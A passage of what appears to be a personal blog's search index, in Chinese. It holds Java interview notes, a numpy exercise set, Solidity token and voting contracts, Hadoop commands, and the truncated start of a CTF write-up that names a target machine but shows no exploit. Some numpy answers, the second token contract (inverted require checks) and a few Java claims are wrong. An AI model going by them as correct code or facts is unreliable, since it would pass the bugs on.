，HashMap 默认大小是 16 ，扩容每次为 2 的指数大小。即使在多线程环境下，现在也有同步的 ConcurrentHashMap 替代，没有必要因为是多线程而用 Hashtable HashSet 和 HashMap 的区别？ Set 是线性结构，值不能重复。HashSet 是 Set 的 hash 实现，HashSet 中值不能重复是用 HashMap 的 key 来实现的。Map 是键值对映射，可以空键空值。HashMap 是 Map 的 hash 实现，key 的唯一性是通过 key 值 hashcode 的唯一来确定，value 值是则是链表结构 HashSet 和 TreeSet 的区别？ HashSet 是用一个 hash 表来实现的，因此，它的元素是无序的。添加，删除和 HashSet 包括的方法的持续时间复杂度是 O(1) 。TreeSet 是用一个树形结构实现的，因此，它是有序的。添加，删除和 TreeSet 包含的方法的持续时间复杂度是 O(logn) 。 如何决定选用 HashMap 还是 TreeMap？ 对于在 Map 中插入、删除和定位元素这类操作，HashMap 是最好的选择。然而，假如你需要对一个有序的 key 集合进行遍历， TreeMap 是更好的选择。 HashMap 和 ConcurrentHashMap 的区别？ConcurrentHashMap 是线程安全的 HashMap 的实现。主要区别如下： 1、ConcurrentHashMap 对整个桶数组进行了分割分段(Segment)，然后在每一个分段上都用 lock 锁进行保护，相对 于Hashtable 的 syn 关键字锁的粒度更精细了一些，并发性能更好。而 HashMap 没有锁机制，不是线程安全的。JDK8 之后，ConcurrentHashMap 启用了一种全新的方式实现,利用 CAS 算法。2、HashMap 的键值对允许有 null ，但是 ConCurrentHashMap 都不允许。 HashMap 的工作原理是什么？HashMap 我们知道在 Java 中最常用的两种结构是数组和模拟指针（引用），几乎所有的数据结构都可以利用这两种来组合实现，HashMap 也是如此。实际上 HashMap 是一个“链表散列”。HashMap 是基于 hashing 的原理。 当两个对象的 hashCode 相同会发生什么？ 因为 hashcode 相同，所以它们的 bucket 位置相同，“碰撞”会发生。因为 HashMap 使用链表存储对象，这个 Entry（包含有键值对的 Map.Entry 对象）会存储在链表中。 HashMap 默认容量是多少？ 默认容量都是 16 ，负载因子是 0.75 。就是当 HashMap 填充了 75% 的 busket 是就会扩容，最小的可能性是（16 * 0.75 = 12），一般为原内存的 2 倍。]]></content>
  </entry>
  <entry>
    <title><![CDATA[《天净沙·我·Java基础》 双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？]]></title>
    <url>%2F2020%2F03%2F04%2F2020%E6%98%A5%E6%8B%9B%2F%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-Java%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[别问 问就是为了面试豁出了老命[文章都是搬运艿艿的][http://svip.iocoder.cn/Java/Core/Interview/] Java基础什么是面向对象？ 面向对象是一种思想，世间万物都可以看做一个对象，这里只讨论面向对象编程（OOP），Java 是一个支持并发、基于类和面向对象的计算机编程语言。面向对象&gt;软件开发具有以下优点： · 代码开发模块化，更易维护和修改。· 代码复用性强。· 增强代码的可靠性和灵活性。· 增加代码的可读性。 请说说面向对象的特征 封装、继承、多态、抽象 重载和重写的区别？ 1）重写 override· 方法名、参数、返回值相同。· 子类方法不能缩小父类方法的访问权限。· 子类方法不能抛出比父类方法更多的异常(但子类方法可以不抛出异常)。· 存在于父类和子类之间。· 方法被定义为 final 不能被重写。2）重载 overload· 参数类型、个数、顺序至少有一个不相同。· 不能重载只有返回值不同的方法名。· 存在于父类和子类、同类中。 Java 中，什么是构造方法？什么是构造方法重载？什么是拷贝构造方法？ 1）构造方法当新对象被创建的时候，构造方法会被调用。每一个类都有构造方法。在程序员没有给类提供构造方法的情况下，Java 编译器会为这个类创建一个默认的构造方法。2）构造方法重载Java 中构造方法重载和方法重载很相似。可以为一个类创建多个构造方法。每一个构造方法必须有它自己唯一的参数列表。3）拷贝构造方法Java 不支持像 C++ 中那样的拷贝构造方法，这个不同点是因为如果你不自己写构造方法的情况下，Java 不会创建默认的拷贝构造方法。 JDK、JRE、JVM 分别是什么关系？ JDK 即为 Java 开发工具包，包含编写 Java 程序所必须的编译、运行等开发工具以及 JRE。开发工具如：· 用于编译 Java 程序的 javac 命令。· 用于启动 JVM 运行 Java 程序的 Java 命令。· 用于生成文档的 Javadoc 命令。· 用于打包的 jar 命令等等。简单说，就是 JDK 包含 JRE 包含 JVMJRE 即为 Java 运行环境，提供了运行 Java 应用程序所必须的软件环境，包含有 Java 虚拟机（JVM）和丰富的系统类库。系统类库即为 Java 提前封装好的功能类，只需拿来直接使用即可，可以大大的提高开发效率。JVM 即为 Java 虚拟机，提供了字节码文件(.class)的运行环境支持 为什么 Java 被称作是“平台无关的编程语言”？ Java 虚拟机是一个可以执行 Java 字节码的虚拟机进程。Java 源文件( .java )被编译成能被 Java 虚拟机执行的字节码文件( .class )。Java 被设计成允许应用程序可以运行在任意的平台，而不需要程序员为每一个平台单独重写或者是重新编译。Java 虚拟机让这个变为可能，因为它知道底层硬件平台的指令长度和其他特性。 JDK8 引入了什么重要的特性? Lambda 表达式和集合之流式 什么是字节码？采用字节码的最大好处是什么 Java 源代码=&gt; 编译器 =&gt; JVM 可执行的 Java 字节码(即虚拟指令)=&gt; JVM =&gt; JVM 中解释器 =&gt; 机器可执行的二进制机器码 =&gt; 程序运行Java 中引入了虚拟机的概念，即在机器和编译程序之间加入了一层抽象的虚拟的机器。这台虚拟的机器在任何平台上都提供给编译程序一个的共同的接口。编译程序只需要面向虚拟机，生成虚拟机能够理解的代码，然后由解释器来将虚拟机代码转换为特定系统的机器码执行。在 Java 中，这种供虚拟机理解的代码叫做字节码（即扩展名为 .class 的文件），它不面向任何特定的处理器，只面向虚拟机。每一种平台的解释器是不同的，但是实现的虚拟机是相同的。Java 源程序经过编译器编译后变成字节码，字节码由虚拟机解释执行，虚拟机将每一条要执行的字节码送给解释器，解释器将其翻译成特定机器上的机器码，然后在特定的机器上运行。这也就是解释了 Java 的编译与解释并存的特点。字节码的好处Java 语言通过字节码的方式，在一定程度上解决了传统解释型语言执行效率低的问题，同时又保留了解释型语言可移植的特点。所以 Java 程序运行时比较高效，而且，由于字节码并不专对一种特定的机器，因此，Java程序无须重新编译便可在多种不同的计算机上运行。 Java 中的几种基本数据类型是什么？ 引用类型声明的变量是指该变量在内存中实际存储的是一个引用地址，实体在堆中· 引用类型包括类、接口、数组等。· 特别注意，String 是引用类型不是基本类型。 什么是值传递和引用传递？ · 值传递，是对基本型变量而言的，传递的是该变量的一个副本，改变副本不影响原变量。· 引用传递，一般是对于对象型变量而言的，传递的是该对象地址的一个副本，并不是原对象本身一般认为，Java 内的传递都是值传递，Java 中实例对象的传递是引用传递 是否可以在 static 环境中访问非 static 变量？ static 变量在 Java 中是属于类的，它在所有的实例中的值是一样的。当类被 Java 虚拟机载入的时候，会对 static 变量进行初始化。如果你的代码尝试不用实例来访问非 static 的变量，编译器会报错，因为这些变量还没有被创建出来，还没有跟任何实例关联上。 char 型变量中能不能存贮一个中文汉字？为什么？ 在 Java 语言中，char 类型占 2 个字节，而且 Java 默认采用 Unicode 编码，一个 Unicode 码是 16 位，所以一个 Unicode 码占两个字节，Java 中无论汉字还是英文字母，都是用 Unicode 编码来表示的。所以，在 Java 中，char 类型变量可以存储一个中文汉字。 String、StringBuffer、StringBuilder 的区别？ String ，是只读字符串，也就意味着 String 引用的字符串内容是不能被改变的(每次对 String 类型进行改变的时候，都会生成一个新的 String 对象，然后将指针指向新的 String 对象。) StringBuffer/StringBuilder 类，表示的字符串对象可以直接进行修改。StringBuilder 是 Java 5 中引入的，它和 StringBuffer 的方法完全相同，区别在于它是在单线程环境下使用的，因为它的所有方面都没有被 synchronized 修饰，因此它的效率也比 StringBuffer 要高。(StringBuffer 每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象并改变对象引用。相同情况下使用 StirngBuilder 相比使用 StringBuffer 仅能获得 10%~15% 左右的性能提升，但却要冒多线程不安全的风险) String s = new String(“xyz”) 会创建几个对象？ 首先，在 String 池内找，找到 “xyz” 字符串，不创建 “xyz” 对应的 String 对象，否则创建一个对象。然后，遇到 new 关键字，在内存上创建 String 对象，并将其返回给 s ，又一个对象。所以，总共是 1 个或者 2 个对象。 什么是自动拆装箱？ 自动装箱和拆箱，就是基本类型和引用类型之间的转换。 为什么要转换？ 如果你在 Java5 下进行过编程的话，你一定不会陌生这一点，你不能直接地向集合( Collection )中放入原始类型值，因为集合只接收对象。 通常这种情况下你的做法是，将这些原始类型的值转换成对象，然后将这些转换的对象放入集合中。使用 Integer、Double、Boolean 等这些类，我们可以将原始类型值转换成对应的对象，但是从某些程度可能使得代码不是那么简洁精炼。 为了让代码简练，Java5 引入了具有在原始类型和对象类型自动转换的装箱和拆箱机制。但是自动装箱和拆箱并非完美，在使用时需要有一些注意事项，如果没有搞明白自动装箱和拆箱，可能会引起难以察觉的 Bug 。 equals 与 == 的区别？ 值类型（int,char,long,boolean 等）的话都是用 == 判断相等性。对象引用的话= 判断引用所指的对象是否是同一个。equals 方法，是 Object 的成员函数，有些类会覆盖(override) 这个方法，用于判断对象的等价性。例如 String 类，两个引用所指向的 String 都是 “abc” ，但可能出现他们实际对应的对象并不是同一个（和 JVM 实现方式有关），因此用 == 判断他们可能不相等，但用 equals方法判断一定是相等的。 如何在父类中为子类自动完成所有的 hashCode 和 equals 实现？这么做有何优劣 父类的 equals ，一般情况下是无法满足子类的 equals 的需求。比如所有的对象都继承 Object ，默认使用的是 Object 的 equals 方法，在比较两个对象的时候，是看他们是否指向同一个地址。但是我们的需求是对象的某个属性相同，就相等了，而默认的 equals 方法满足不了当前的需求，所以我们要重写 equals 方法。如果重写了 equals 方法，就必须重写 hashCode 方法，否则就会降低 Map 等集合的索引速度 equals 方法，用于比较对象的内容是否相等 当覆盖了 equals 方法时，比较对象是否相等将通过覆盖后的 equals 方法进行比较（判断对象的内容是否相等）。 hashCode 方法，大多在集合中用到。 将对象放入到集合中时，首先判断要放入对象的 hashCode 值与集合中的任意一个元素的 hashCode 值是否相等，如果不相等直接将该对象放入集合中。如果 hashCode 值相等，然后再通过 equals 方法判断要放入对象与集合中的任意一个对象是否相等，如果 equals 判断不相等，直接将该元素放入到集合中，否则不放入。 有没有可能 2 个不相等的对象有相同的 hashCode？ 可能会发生，这个被称为哈希碰撞。当然，相等的对象，即我们重写了 equals 方法，一定也要重写 hashCode 方法，否则将出现我们在 HashMap 中，相等的对象作为 key ，将找不到对应的 value 。· equals 不相等，hashCode 可能相等。· equals 相等，请重写 hashCode 方法，保证 hashCode 相等。 final、finally、finalize 的区别？final是修饰符关键字 一个类被声明为 final ，意味着它不能再派生出新的子类，不能作为父类被继承。因此一个类不能既被声明为 abstract 的，又被声明为 final 的。将变量或方法声明为 final ，可以保证它们在使用中不被改变。被声明为 final 的变量必须在声明时给定初值，而在以后的引用中只能读取，不可修改。被声明为 final 的方法也同样只能使用，不能重写。 finally 异常处理时提供 finally 块来执行任何清除操作。如果抛出一个异常，那么相匹配的 catch 子句就会执行，然后控制就会进入 finally 块（如果有的话）。在以下 4 种特殊情况下，finally块不会被执行： 在 finally 语句块中发生了异常。 在前面的代码中用了 System.exit() 退出程序。 程序所在的线程死亡。 关闭 CPU 。 finalize 是方法名 Java 允许使用 #finalize() 方法，在垃圾收集器将对象从内存中清除出去之前做必要的清理工作。这个方法是由垃圾收集器在确定这个对象没有被引用时对这个对象调用的。它是在 Object 类中定义的，因此所有的类都继承了它。子类覆盖 finalize() 方法，以整理系统资源或者执行其他清理工作。 #finalize() 方法，是在垃圾收集器删除对象之前对这个对象调用的。 String 类能被继承吗，为什么？ 不能，因为 String 是 final 修饰 抽象类和接口有什么区别？ 从设计层面来说，抽象是对类的抽象，是一种模板设计，接口是行为的抽象，是一种行为的规范。 请详细讲述一下 RandomAccess 接口有什么作用？ RandomAccess 用来当标记的，是一种标记接口，接口的非典型用法。意思是，随机访问任意下标元素都比较快。用处，当要实现某些算法时，会判断当前类是否实现了 RandomAccess 接口，会根据结果选择不同的算法 讲讲类的实例化顺序？ 父类静态变量 父类静态代码块 子类静态变量、 子类静态代码块 父类非静态变量（父类实例成员变量） 父类构造函数 子类非静态变量（子类实例成员变量） 子类构造函数什么是内部类？ 简单的说，就是在一个类、接口或者方法的内部创建另一个类。 内部类的作用是什么？ 内部类提供了更好的封装，除了该外围类，其他类都不能访问。 Anonymous Inner Class(匿名内部类)是否可以继承其它类？是否可以实现接口 可以继承其他类或实现其他接口，在 Java 集合的流式操作中，我们常常这么干 内部类可以引用它的包含类（外部类）的成员吗？有没有什么限制 一个内部类对象可以访问创建它的外部类对象的成员，包括私有成员。 什么是 Java IO ？ Java IO 相关的类，在 java.io 包下，具体操作分成面向字节(Byte)和面向字符(Character)两种方式 什么是 Java 序列化？ 序列化就是一种用来处理对象流的机制，所谓对象流也就是将对象的内容进行流化。· 可以对流化后的对象进行读写操作，也可将流化后的对象传输于网络之间。· 序列化是为了解决在对对象流进行读写操作时所引发的问题。 如何实现 Java 序列化？ 将需要被序列化的类，实现 Serializable 接口，该接口没有需要实现的方法，implements Serializable 只是为了标注该对象是可被序列化的。序列化· 然后，使用一个输出流(如：FileOutputStream)来构造一个 ObjectOutputStream(对象流)对象· 接着，使用 ObjectOutputStream 对象的 #writeObject(Object obj) 方法，就可以将参数为 obj 的对象写出(即保存其状态)。反序列化要恢复的话则用输入流 Java 序列话中，如果有些字段不想进行序列化怎么办？ 对于不想进行序列化的变量，使用 transient 关键字修饰。 如何实现对象克隆？ 实现 Cloneable 接口，并重写 Object 类中的 #clone() 方法。可以实现浅克隆，也可以实现深克隆。 实现 Serializable 接口，通过对象的序列化和反序列化实现克隆。可以实现真正的深克隆。 浅克隆 浅度克隆对于要克隆的对象，对于其基本数据类型的属性，复制一份给新产生的对象，对于非基本数据类型的属性，仅仅复制一份引用给新产生的对象，即新产生的对象和原始对象中的非基本数据类型的属性指向的是同一个对象 深克隆 在浅度克隆的基础上，对于要克隆的对象中的非基本数据类型的属性对应的类，也实现克隆，这样对于非基本数据类型的属性，复制的不是一份引用，即新产生的对象和原始对象中的非基本数据类型的属性指向的不是同一个对象 深克隆，浅克隆最大的区别在于新生成的克隆对象中的非基本数据类型是否是一个对象 error 和 exception 有什么区别？CheckedException 和 RuntimeException 有什么区别？ Java 的异常体系，基于共同的祖先 java.lang.Throwable 类 Error（错误） 表示系统级的错误和程序不必处理的异常，是 Java 运行环境中的内部错误或者硬件问题。例如：内存资源不足等。对于这种错误，程序基本无能为力，除了退出运行外别无选择，它是由 Java 虚拟机抛出的。 Exception（异常）， 表示需要捕捉或者需要程序进行处理的异常，它处理的是因为程序设计的瑕疵而引起的问题或者在外的输入等引起的一般性问题，是程序必须处理的。Exception 又分为运行时异常，受检查异常。RuntimeException(运行时异常)，表示无法让程序恢复的异常，导致的原因通常是因为执行了错误的操作，建议终止逻辑，因此，编译器不检查这些异常。CheckedException(受检查异常)，是表示程序可以处理的异常，也即表示程序可以修复（由程序自己接受异常并且做出处理），所以称之为受检查异常 异常的使用的注意地方？ 不要将异常处理用于正常的控制流（设计良好的 API 不应该强迫它的调用者为了正常的控制流而使用异常）。 对可以恢复的情况使用受检异常，对编程错误使用运行时异常。 避免不必要的使用受检异常（可以通过一些状态检测手段来避免异常的发生）。 优先使用标准的异常。 每个方法抛出的异常都要有文档。 保持异常的原子性。 不要在 catch 中忽略掉捕获到的异常。 throw 与 throws 的区别 ？ throw ，用于在程序中显式地抛出一个异常。throws ，用于指出在该方法中没有处理的异常。每个方法必须显式指明哪些异常没有处理，以便该方法的调用者可以预防可能发生的异常。最后，多个异常用逗号分隔。 异常处理中 finally 语句块的重要性 不管程序是否发生了异常, finally 语句块都会被执行，甚至当没有catch 声明但抛出了一个异常时, finally 语句块也会被执行。finally 语句块通常用于释放资源, 如 I/O 缓冲区, 数据库连接等等 说说反射的用途及实现？ https://www.cnblogs.com/zhaopei/p/reflection.html java 反射机制主要提供了以下功能： 在运行时构造一个类的对象。 判断一个类所具有的成员变量和方法。 调用一个对象的方法。 生成动态代理。 反射的应用很多，很多框架都有用到： Spring 框架的 IoC 基于反射创建对象和设置依赖属性。Spring MVC 的请求调用对应方法，也是通过反射。JDBC 的 Class#forName(String className) 方法，也是使用反射。 反射中，Class.forName 和 ClassLoader 区别？这两者，都可用来对类进行加载。差别在于： Class#forName(…) 方法，除了将类的 .class 文件加载到JVM 中之外，还会对类进行解释，执行类中的 static 块。 ClassLoader 只干一件事情，就是将 .class 文件加载到 JVM 中，不会执行 static 中的内容，只有在 newInstance 才会去执行 static 块。 Class#forName(name, initialize, loader) 方法，带参函数也可控制是否加载 static 块，并且只有调用了newInstance 方法采用调用构造函数，创建类的对象。 UnsupportedOperationException 是什么？ UnsupportedOperationException ，是用于表明操作不支持的异常。在 JDK 类中已被大量运用，在集合框架java.util.Collections.UnmodifiableCollection 将会在所有 add 和 remove 操作中抛出这个异常 什么是注解 Java注解又称为标注，是Java从1.5开始支持加入源码的特殊语法元数据；Java中的类、方法、变量、参数、包都可以被注解。 什么时候用断言（assert）？ 断言，在软件开发中是一种常用的调试方式，很多开发语言中都支持这种机制。 一般来说，断言用于保证程序最基本、关键的正确性。断言检查通常在开发和测试时开启。为了保证程序的执行效率，在软件发布后断言检查通常是关闭的。断言是一个包含布尔表达式的语句，在执行这个语句时假定该表达式为true；如果表达式的值为 false ，那么系统会报告一个AssertionError 错误。断言的使用如下面的代码所示： assert(a &gt; 0); // throws an AssertionError if a &lt;= 0断言可以有两种形式：assert Expression1; 。assert Expression1 : Expression2; 。Expression1 应该总是产生一个布尔值。Expression2 可以是得出一个值的任意表达式；这个值用于生成显示更多调试信息的字符串消息。要在运行时启用断言，可以在启动 JVM 时使用 -enableassertions 或者 -ea 标记。要在运行时选择禁用断言，可以在启动 JVM 时使用 -da 或者 -disableassertions 标记。要在系统类中启用或禁用断言，可使用 -esa 或 -dsa 标记。还可以在包的基础上启用或者禁用断言。当然，实际场景下，我们会在 Spring 的源码中看到，它自己封装了 Assert 类，实现更方便的断言功能，并且，在生产环境下也启用。另外，在单元测试中，也会使用自己封装的断言类，判断执行结果的正确与错误。 Java 对象创建的方式？ 使用 new 关键字创建对象。 使用 Class 类的 newInstance 方法(反射机制)。 使用 Constructor 类的 newInstance 方法(反射机制)。 使用 clone 方法创建对象。 使用(反)序列化机制创建对象Java基础面试网址集合极客学院32道常见的Java基础面试题Java基础知识]]></content>
  </entry>
  <entry>
    <title><![CDATA[numpy学习]]></title>
    <url>%2F2020%2F03%2F04%2Fnumpy%2F</url>
    <content type="text"><![CDATA[numpy作业 1.导入numpy库 import numpy as np 2. 建立一个一维数组 a 初始化为[4,5,6], (1)输出a 的类型（type）(2)输出a的各维度的大小（shape）(3)输出 a的第一个元素（值为4） a = np.array([4,5,6])print(a.dtype)print(a.shape)print(a[0]) 3. 建立一个二维数组 b,初始化为 [ [4, 5, 6],[1, 2, 3]] (1)输出各维度的大小（shape）(2)输出 b(0,0)，b(0,1),b(1,1) 这三个元素（对应值分别为4,5,2） a = np.array([[4,5,6],[1,2,3]])print(a.shape)print(a[0].shape)print(a[1].shape)print(a[0][0])print(a[0][1])print(a[1][1]) 4.(1)建立一个全0矩阵 a, 大小为 3x3; 类型为整型（提示: dtype = int）(2)建立一个全1矩阵b,大小为4x5; (3)建立一个单位矩阵c ,大小为4x4; (4)生成一个随机数矩阵d,大小为 3x2 a = np.zeros([3,3], dtype = int)b = np.ones([4,5])c = np.ones([4,4])d = np.empty([3,2])print(a,b,c,d) 5. 建立一个数组 a,(值为[[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]] ) ,(1)打印a; (2)输出 下标为(2,3),(0,0) 这两个数组元素的值 a = np.array([[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]])print(a[2][3])print(a[0][0]) 6.把上一题的 a数组的 0到1行 2到3列，放到b里面去，（此处不需要从新建立a,直接调用即可）(1),输出b;(2) 输出b 的（0,0）这个元素的值 b = a[0:2,2:4]print(b) 7.把第5题中数组a的最后两行所有元素放到 c中，（提示： a[1:2, :]）(1)输出 c ; (2) 输出 c 中第一行的最后一个元素（提示，使用 -1 表示最后一个元素） c = a[1:3]print(c)print(c[-1][-1]) 8.建立数组a,初始化a为[[1, 2], [3, 4], [5, 6]]，输出 （0,0）（1,1）（2,0）这三个元素（提示： 使用 print(a[[0, 1, 2], [0, 1, 0]]) ） a = np.array([[1, 2], [3, 4], [5, 6]])print(a[0,1])print(a[1,1])print(a[2,0]) 9.建立矩阵a ,初始化为[[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]]，输出(0,0),(1,2),(2,0),(3,1) (提示使用 b = np.array([0, 2, 0, 1]) print(a[np.arange(4), b])) a = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]])b = np.array([0,2,0,1])print(a[np.arange(4),b]) 10.对9 中输出的那四个元素，每个都加上10，然后重新输出矩阵a.(提示： a[np.arange(4), b] += 10 ） print(a[np.arange(4),b] + 10) 11. 执行 x = np.array([1, 2])，然后输出 x 的数据类型 x = np.array([1,2])print(x.dtype) 12.执行 x = np.array([1.0, 2.0]) ，然后输出 x 的数据类类型 x = np.array([1.0,2.0])print(x.dtype) 13.执行 x = np.array([[1, 2], [3, 4]], dtype=np.float64) ，y = np.array([[5, 6], [7, 8]], dtype=np.float64)，然后输出 x+y ,和 np.add(x,y) x= np.array([[1, 2], [3, 4]], dtype=np.float64)y = np.array([[5, 6], [7, 8]])print(x+y)print(np.add(x,y)) 14. 利用 13题目中的x,y 输出 x-y 和 np.subtract(x,y) print(x-y)print(np.subtract(x,y)) 15. 利用13题目中的x，y 输出 x*y ,和 np.multiply(x, y) 还有 np.dot(x,y),比较差异。然后自己换一个不是方阵的试试。 print(xy)print(np.dot(x,y))a = np.ones([5,5])b = np.ones([5,5])print(ab)print(np.dot(a,b)) 16. 利用13题目中的x,y,输出 x / y .(提示 ： 使用函数 np.divide()) print(x/y)print(np.divide(x,y)) 17. 利用13题目中的x,输出 x的 开方。(提示： 使用函数 np.sqrt() ) print(np.sqrt(x)) 18.利用13题目中的x,y ,执行 print(x.dot(y)) 和 print(np.dot(x,y)) print(x.dot(y))print(np.dot(x,y)) 19.利用13题目中的 x,进行求和。提示：输出三种求和 (1)print(np.sum(x)): (2)print(np.sum(x，axis =0 )); (3)print(np.sum(x,axis = 1)) print(np.sum(x))print(np.sum(x,axis=0))print(np.sum(x,axis=1)) 20.利用13题目中的 x,进行求平均数（提示：输出三种平均数(1)print(np.mean(x)) (2)print(np.mean(x,axis = 0))(3) print(np.mean(x,axis =1))） print(np.mean(x))print(np.mean(x,axis=0))print(np.mean(x,axis=1)) 21.利用13题目中的x，对x 进行矩阵转置，然后输出转置后的结果，（提示： x.T 表示对 x 的转置） print(x)print(x.T) 22.利用13题目中的x,求e的指数（提示： 函数 np.exp()） print(np.exp(x)) 23.利用13题目中的 x,求值最大的下标（提示(1)print(np.argmax(x)) ,(2) print(np.argmax(x, axis =0))(3)print(np.argmax(x),axis =1)) print(np.argmax(x))print(np.argmax(x,axis=0))print(np.argmax(x),axis=1) 24.画图，y=x*x 其中 x = np.arange(0, 100, 0.1) （提示这里用到 matplotlib.pyplot 库） x = np.arange(0, 100, 0.1)y = x * xplt.plot(x, y)plt.show() 25.画图。画正弦函数和余弦函数， x = np.arange(0, 3 * np.pi, 0.1)(提示：这里用到 np.sin() np.cos() 函数和 matplotlib.pyplot 库) x = np.arange(0, 3*np.pi, 0.1)y = np.sin(x)plt.plot(x, y)plt.show()y = np.cos(x)plt.plot(x, y)plt.show()]]></content>
  </entry>
  <entry>
    <title><![CDATA[区块链]]></title>
    <url>%2F2019%2F11%2F17%2F%E5%8C%BA%E5%9D%97%E9%93%BE%2F</url>
    <content type="text"><![CDATA[区块链导航雷达区块链白皮书 https://ethfans.org/posts/ethereum-whitepaper 钱包教程 http://www.aibbt.com/a/26227.html 国内矿池f2pool https://www.f2pool.com/ truffleTruffle 教程：教你开发、部署第一个去中心化应用 (Dapp) - 宠物商店 blockchain-demoMyToken - EC20 - 官方铸币代码 version 1.0 123456789101112131415161718192021222324pragma solidity ^0.4.20;contract MyToken&#123; /*创建一个带有全部余额的key-value数组*/ mapping(address =&gt; uint256) public balanceOf ; /*初始化区块铸币总金额，利用这样的方法可以保证货币后期总量不会被改变*/ function myToken (uint256 initialSupply) public &#123; balanceOf[msg.sender] = initialSupply ; &#125; /*金额转账*/ function transfer (address _to,uint256 _value) public &#123; /*确保发出请求的余额充足*/ require(balanceOf[msg.sender] &gt;= _value); /*过流检验*/ require(balanceOf[_to] + _value &gt;= balanceOf[_to]) ; balanceOf[msg.sender] -= _value ; balanceOf[_to] += _value ; &#125;&#125; version 2.01234567891011121314151617181920212223242526272829303132333435363738pragma solidity ^0.4.21;contract MyToken&#123; string public name ; // coin name string public symbol ; // coin symbol uint8 public decimals ; // coin decimals // key-value for all people in this block mapping(address =&gt; uint256) public balanceOf ; // track for dealing event Transfer (address indexed_from,address indexed_to,uint256 value) ; constructor(uint256 _supply,string _name,string _symbol,uint8 _decimals) public &#123; if (_supply == 0) _supply == 1000000 ; balanceOf[msg.sender] = _supply ; name = _name ; symbol = _symbol ; decimals = _decimals ; &#125; function transfer (address _to,uint256 _value) public &#123; require(balanceOf[msg.sender] &lt; _value) ; require(balanceOf[_to] + _value &lt; balanceOf[_to]) ; balanceOf[msg.sender] -= _value ; balanceOf[_to] += _value ; emit Transfer(msg.sender,_to,_value) ; &#125; &#125; 投票系统 - 综合类合约123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119pragma solidity ^0.4.22 ;// 投票合约contract Ballot&#123; //此处声明一个新的复合类型，代表一个单一投票者 struct Voter&#123; uint weight ; bool voted ; address delegate ; uint vote ; &#125; // 用于单一提案的结构类型 struct Proposal&#123; bytes32 name ; uint voteCount ; &#125; // 当前选票人地址 address public chairperson ; // 投票人员 mapping (address =&gt; Voter) public voters ; // 提案编号 Proposal[] public proposals ; // 选择proposalNames 创建新的的投票 constructor (bytes32[] proposalNames) public &#123; chairperson = msg.sender ; voters[chairperson].weight = 1 ; // 对于每个提供的提案名，创建一个新的提案对象，加到数组末尾 for (uint i=0;i&lt;proposalNames.length;i++)&#123; proposals.push(Proposal(&#123; name : proposalNames[i], voteCount : 0 &#125;)); &#125; &#125; // 对于本次投票中的“voter”给予投票权，只能由 “chairperson”调用 function giveRightToVote(address voter) public &#123; // 如果require的第一个参数结果为false，则执行中止，所有状态变化，以太币余额变化都会还原 // 老版EVM中，这会耗光所有GAS // “require” 来检查函数是否正确调用 require( msg.sender == chairperson , "only chairperson can give right to vote" ); require( !voters[voter].voted, "The voter already voted" ); require(voters[voter].weight == 0) ; voters[voter].weight = 1 ; &#125; // 把投票权赋予投票人 “to” function delegate(address to) public &#123; // 对引用赋值 Voter storage sender = voters[msg.sender] ; require (!sender.voted,"You are already voted") ; require(to != msg.sender, "self-delegation is disallowed") ; // 当“to”也是被授权时，继续转授权 // 一般来说这种循环很危险，因为运行时间长，与完成一个区块相比，需要更多的gas费用 // 在本例中，代表授权不会被执行。在其他情况下，这一循环可能导致合约的非正常运行 while (voters[to].delegate != address(0))&#123; to = voters[to].delegate ; // 检验是否存在不允许的代表授权 require(to != msg.sender,"Found loop in delegation") ; &#125; // sender是一个引用，所以修改了“voters[msg.sender].voted” sender.voted = true ; sender.delegate = to ; Voter storage delegate_ = voters[to] ; if (delegate_.voted)&#123; // 如果代表已投票，则直接增加投票数量 proposals[delegate_.vote].voteCount += sender.weight ; &#125;else &#123; // 如果代表未投票，则增加权重 delegate_.weight += sender.weight ; &#125; &#125; // 将投票（包括授权给你的投票）投给提案“proposals[proposal].name” function vote (uint proposal) public &#123; Voter storage sender = voters[msg.sender] ; require(!sender.voted,"Already voted") ; sender.voted = true ; sender.vote = proposal ; // 如果 “proposal”超过数组范围，则自动释放这一信息，并还原所有改变 proposals[proposal].voteCount += sender.weight ; &#125; // 根据此前全部投票，统计获胜提案 function winningProposal() public view returns (uint winningProposal_)&#123; uint winningVoteCount = 0 ; for (uint p=0;p&lt;proposals.length;p++)&#123; if (proposals[p].voteCount &gt; winningVoteCount)&#123; winningVoteCount = proposals[p].voteCount ; winningProposal_= p ; &#125; &#125; &#125; // 调用call winningPropopsal() 函数取得包含在提案数组中的获胜者的索引，并返回获胜者的名称 function winnerName() public view returns (bytes32 winnerName_)&#123; winnerName_ = proposals[winningProposal()].name ; &#125;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[hadoop操作]]></title>
    <url>%2F2019%2F10%2F25%2Fhadoop%2F</url>
    <content type="text"><![CDATA[hadoop 系列操作 hadoop 启动 cd ** 进入hadoop目录./sbin/start-dfs.sh 启动hadoop-dfs./sbin/start-all.sh 启动所有的]]></content>
  </entry>
  <entry>
    <title><![CDATA[ctf - 合集]]></title>
    <url>%2F2019%2F10%2F24%2FCTF-%E5%81%9A%E9%A2%98%E5%90%88%E9%9B%86%2F</url>
    <content type="text"><![CDATA[自己后来做过的各种乱七八糟的题目 爱い窒息、痛 —- php源码阅读,让系统读木马 靶机：http://114.55.36.69:80201234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?php/* vim: set expandtab tabstop=4 shiftwidth=4: */// +----------------------------------------------------------------------+// | PHP version 5 |// +----------------------------------------------------------------------+// | Copyright (c) 1997-2004 The PHP Group |// +----------------------------------------------------------------------+// | This source file is subject to version 3.0 of the PHP license, |// | that is bundled with this package in the file LICENSE, and is |// | available through the world-wide-web at the following url: |// | http://www.php.net/license/3_0.txt. |// | If you did not receive a copy of the PHP license and are unable to |// | obtain it through the world-wide-web, please send a note to |// | license@php.net so we can mail you a copy immediately. |// +----------------------------------------------------------------------+// | Authors: Original Author 